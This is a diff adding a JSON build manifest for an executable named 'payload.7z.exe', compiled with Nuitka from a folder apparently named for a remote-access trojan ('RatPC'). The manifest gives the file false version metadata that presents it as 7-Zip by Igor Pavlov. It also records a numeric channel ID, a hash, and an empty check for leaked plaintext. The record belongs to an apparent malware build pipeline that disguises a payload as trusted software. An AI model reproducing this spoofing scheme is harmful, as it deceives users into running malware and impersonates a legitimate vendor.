@@ -1,0 +1,18 @@
+{
+  "uuid": "7b05519d-42a4-4412-808d-8dd28237b158",
+  "alias": "a",
+  "name": "payload.7z",
+  "channel": 1526964484826988698,
+  "engine": "nuitka",
+  "artifact": "D:\\Buat rusuh\\RatPC\\dist\\payload.7z.exe",
+  "built": "2026-10-30T12:16:33",
+  "meta": {
+    "company": "Igor Pavlov",
+    "product": "7-Zip",
+    "desc": "7-Zip Archive",
+    "version": "24.9.0.0"
+  },
+  "size": 14586368,
+  "sha256": "06a7c0627b36d01e41370c6c9070b94776541c18e741c49c58ed05062c6cebdc",
+  "plaintext_leaks": []
+}
